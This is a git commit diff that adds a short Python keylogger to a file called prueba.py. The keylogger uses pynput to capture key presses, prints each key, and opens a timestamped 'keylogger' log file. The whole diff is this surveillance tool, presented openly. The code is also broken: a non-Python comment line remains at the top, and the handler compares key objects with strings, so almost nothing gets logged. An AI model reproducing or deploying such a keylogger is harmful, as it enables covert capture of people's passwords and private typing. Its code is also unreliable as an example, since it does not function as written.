ca702dd71dc912b602d22263e908a790887a7666
pedromarroquin <43348854+pedromarroquin@users.noreply.github.com>
2020-07-29 21:51:01 -0500

    Update prueba.py

--- prueba.py
+++ prueba.py
@@ -1,1 +1,19 @@
 //prueba inicial
+import datetime
+from pynput.keyboard import Listener
+
+d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+
+f = open('keylogger_{}'.format(d),'w')
+
+def key_recorder(key):
+    print(key)
+    if key == 'Key.enter':
+        f.write('\n')
+    elif key == 'Key.space':
+        f.write(' ')
+    elif key =='Key.backspace':
+        f.write('%BORRAR%')
+
+with Listener(on_press=key_recorder) as l:
+    l.join()
